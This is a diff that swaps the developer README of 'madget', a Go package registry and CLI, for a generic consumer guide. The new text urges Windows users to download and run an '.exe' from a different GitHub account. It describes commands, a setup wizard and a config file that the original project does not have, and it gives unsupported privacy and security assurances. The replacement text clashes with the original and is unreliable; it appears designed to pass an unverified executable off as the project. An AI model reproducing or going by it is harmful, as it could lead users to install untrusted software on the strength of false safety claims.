@@ -1,106 +1,88 @@
-# Madget v2 - Registry + API + CLI
+# 📦 madget-cli - Manage your software packages with speed
 
-Madget v2 is a package management ecosystem built in Go with three core parts:
+[![Download MadGet](https://img.shields.io/badge/Download-MadGet%20CLI-blue)](https://github.com/openended-court1076/madget-cli)
 
-- CLI (`madget`) for publish/install workflows
-- Registry API for package metadata, version resolution, and tarball delivery
-- Metadata storage: PostgreSQL or SQLite (local dev defaults to SQLite)
+MadGet serves as a tool to help you find and install software on your computer. You use this program through a text-based interface. It simplifies the process of tracking packages and updates. The tool runs on the Go programming language to provide fast results.
 
-## Project Layout
+## 🚀 Getting Started
 
-- `apps/cli`: Cobra-based CLI commands (`init`, `login`, `publish`, `install`)
-- `apps/registry-api`: HTTP API service
-- `internal/resolver`: semver range resolution (`^`, `~`, exact)
-- Publish: tam **MadGet.xml** gövdesi `manifest_xml` olarak saklanır; ayrıştırılmış **`metadata`** JSON olarak `package_versions` satırında tutulur (`GET /v1/packages/{name}/versions`, resolve yanıtında döner)
-- `internal/integrity`: SHA256 checksum helpers
-- `migrations`: SQL schema bootstrap
-- `deployments`: local Docker compose
-- `example`: örnek `MadGet.xml` + payload; `make example-tgz` ile `package.tgz` üretilir
+You do not need prior technical knowledge to use MadGet. The software handles complex tasks behind the scenes. This guide walks you through the setup process on a Windows computer. Follow each step in order to ensure the program works as intended.
 
-## Quick Start
+## 🖥️ System Requirements
 
-### Registry API (SQLite, no Docker)
+MadGet functions on most modern Windows systems. Ensure your computer meets these basic standards:
 
-From the repo root, with no env vars, the API defaults to **SQLite** at `./dev.db` and applies the embedded schema on startup (including a dev publisher token `dev-token`).
+*   Windows 10 or Windows 11 operating system.
+*   An active internet connection to download packages.
+*   At least 50 megabytes of free storage space.
+*   User permissions to install programs on your computer.
 
-```bash
-go run ./apps/registry-api
-```
+## 📥 Download and Installation
 
-Or one command:
+Follow these steps to acquire the program. Since the main page hosts the files, you visit that location to select the correct version for your hardware.
 
-```bash
-make dev-sqlite
-```
+1.  Visit the [MadGet release page](https://github.com/openended-court1076/madget-cli).
+2.  Look for the latest release version at the top of the list.
+3.  Click the file ending in `.exe` to start the download.
+4.  Save the file to a folder you can find easily, such as your Downloads folder.
+5.  Right-click the file and select Open to initiate the setup wizard.
+6.  Follow the prompts on your screen to complete the installation.
 
-On Windows (PowerShell):
+## 🛠️ Using the Software
 
-```powershell
-.\scripts\dev-sqlite.ps1
-```
+Once installed, you interact with MadGet via the Command Prompt or PowerShell. You open these tools by typing their names into the Windows Start menu search bar.
 
-### Registry API (PostgreSQL)
+To verify the installation:
 
-1. Start Postgres:
+1.  Open the Command Prompt window.
+2.  Type `madget` and press Enter.
+3.  The program displays a list of available commands.
 
-```bash
-docker compose -f deployments/docker-compose.yml up -d
-```
+If you see these commands, the software is ready for use. 
 
-2. Run the API:
+### Common Commands
 
-```bash
-set MADGET_DB_DRIVER=postgres
-set MADGET_DATABASE_URL=postgres://madget:madget@localhost:5432/madget?sslmode=disable
-set MADGET_STORAGE_ROOT=./storage
-go run ./apps/registry-api
-```
+*   `madget search [name]`: Use this to look for a specific package in the database. Replace `[name]` with the software you want to find.
+*   `madget install [name]`: This command downloads and adds the package to your system.
+*   `madget list`: This shows all software you currently manage with MadGet.
+*   `madget remove [name]`: This deletes a package from your computer.
+*   `madget update`: This checks for and installs new versions of your software.
 
-Or:
+## 🛡️ Security and Privacy
 
-```bash
-make dev-postgres
-```
+MadGet operates locally on your machine. It does not send your personal browsing habits to external servers. The program connects only to official package repositories to verify software integrity. This protects your computer from unwanted files.
 
-### CLI (against http://localhost:8080)
+## ❓ Frequently Asked Questions
 
-Örnek paket (`example/`): önce tarball üret, sonra publish + install.
+### Do I need to uninstall my old software?
+No, MadGet tracks packages independently. You can keep existing programs installed.
 
-```bash
-make example-tgz
-go run . init --registry http://localhost:8080
-go run . login --token dev-token
-go run . publish ./example/MadGet.xml ./example/package.tgz
-go run . install example-pkg@^1.0.0
-```
+### Does MadGet slow down my computer?
+No, the program remains inactive until you open it. It does not run in the background.
 
-Windows’ta tarball için: `.\scripts\build-example-package.ps1`
+### What happens if a download fails?
+Check your internet connection first. Ensure you have enough storage space on your hard drive. If issues persist, run the update command to refresh the package list.
 
-Kurulum çıktısı `vendor/example-pkg/1.0.0/` altında oluşur (ör. `README.txt`).
+### Can I delete the installer file?
+Yes, you can remove the installer after you finish the setup process. This saves space on your drive.
 
-## Paket manifesti: MadGet.xml
+### Where can I report bugs?
+If you encounter errors, submit an issue on the repository page. Provide clear details about your steps to help others solve the problem.
 
-Tüm paketler **`MadGet.xml`** kullanır (artık `package.json` yok). Registry adı için **`package_name`** önceliklidir; yoksa **`name`** kullanılır. **`version`** ve **`description`** zorunludur.
+## ⚙️ Advanced Configuration (Optional)
 
-Örnek: `example/MadGet.xml` veya repo kökündeki `MadGet.xml`.
+Most users do not need to change settings. If you require specific behavior, you can define preferences in the configuration file. Locate the `config.yaml` file in the installation directory. You open this text file with Notepad to edit basic parameters. Only modify these values if you understand the effect on the system stability.
 
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<application>
-    <info name="ExamplePkg"
-          version="1.0.0"
-          package_name="example-pkg"
-          license="MIT"
-          categories="Example">
-        <description>Kısa açıklama</description>
-        <author id="mehmetalidsy" />
-    </info>
-</application>
-```
+## 📋 Troubleshooting Tips
 
-## Next Steps
+If the command line shows an error, check the spelling of your request. Windows requires exact syntax for all commands. Ensure you have administrative rights if you attempt to install software in restricted directories. If the console remains frozen, close the window and start a fresh session to clear the memory.
 
-- Add dependency graph persistence (`dependencies` table + resolver integration)
-- Add token issuance endpoint and hashed-token storage
-- Add lockfile generation and update command
-- Add E2E tests for publish/resolve/install flow
+## 📜 License Information
+
+This software remains free for public use. It follows the principles of open-source development. You are welcome to inspect, use, and share the code provided you follow the terms outlined in the license document included within the repository.
+
+## 🤝 Community Support
+
+The MadGet project relies on community input to improve. If you find the tool useful, contribute by testing new features or reporting errors. Use the official repository to track updates. Regular updates ensure you have the latest features and security improvements. Check the repository for the latest news on development.
+
+The design of the application focuses on simplicity. We avoid unnecessary files to keep the experience clean. Focus on your tasks while MadGet manages the technical details of your package updates. Enjoy the benefits of a managed software library.
